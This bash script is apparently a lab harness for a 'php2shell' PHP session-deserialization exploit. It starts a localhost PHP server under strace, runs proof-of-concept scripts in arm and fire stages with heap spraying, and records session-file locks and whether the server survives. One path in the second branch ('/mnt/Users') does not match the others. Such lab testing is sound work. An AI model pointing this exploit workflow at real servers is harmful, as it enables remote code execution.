#!/bin/bash
# strace-instrumented php2shell lab run. Args: port bug(u|s)
set -u
PORT=${1:-18087}
BUG=${2:-u}
ROOT=/tmp/php2shell2
SID_U=u0123456789abcdefghijklmnopqrstuv
SID_S=s0123456789abcdefghijklmnopqrstuv

pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null
sleep 0.3
rm -rf "$ROOT"; mkdir -p "$ROOT/sess"
cp /mnt/c/Users/andre/Downloads/php2shell-claude/lab_index.php "$ROOT/index.php"

strace -f -qq -e trace=openat,flock -s 160 -o "$ROOT/strace.log" \
  php -S 127.0.0.1:$PORT -t "$ROOT" \
  -d memory_limit=8M -d display_errors=0 \
  -d post_max_size=32M -d upload_max_filesize=32M -d max_file_uploads=25 \
  -d session.upload_progress.min_freq=0 \
  -d session.save_path="$ROOT/sess" \
  > "$ROOT/server.log" 2>&1 &
SRV=$!
sleep 1.2
curl -s -o /dev/null http://127.0.0.1:$PORT/index.php

if [ "$BUG" = "u" ]; then
  timeout 60 python3 /mnt/c/Users/andre/Downloads/php2shell-claude/poc_unserialize.py \
    "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID_U" --skip-fire 2>&1
  # the arm bailout leaked a flock'd fd on the sess file; delete the file so
  # the fire's stale-PS(id) flush open()s a fresh inode instead of deadlocking
  rm -f "$ROOT/sess/sess_$SID_U"
  echo "--- arm sess file removed; firing on same sid (fresh inode) ---"
  timeout 60 python3 /mnt/c/Users/andre/Downloads/php2shell-claude/poc_unserialize.py \
    "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID_U" --fire-sid "$SID_U" --skip-arm --spray 700 2>&1
else
  timeout 60 python3 /mnt/c/Users/andre/Downloads/php2shell-claude/poc_serialize.py \
    "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID_S" --skip-fire 2>&1
  rm -f "$ROOT/sess/sess_$SID_S"
  echo "--- arm sess file removed; firing on same sid (fresh inode) ---"
  timeout 60 python3 /mnt/Users/andre/Downloads/php2shell-claude/poc_serialize.py \
    "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID_S" 2>&1
fi
sleep 0.5
kill -0 $SRV 2>/dev/null && echo "SERVER ALIVE" || echo "SERVER DEAD"
pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null
sleep 0.3
echo "=== sess files ==="
ls -la "$ROOT/sess"
echo "=== strace: sess opens + flocks (chronological) ==="
grep -E 'sess_|flock' "$ROOT/strace.log" | grep -v ECHILD | tail -40
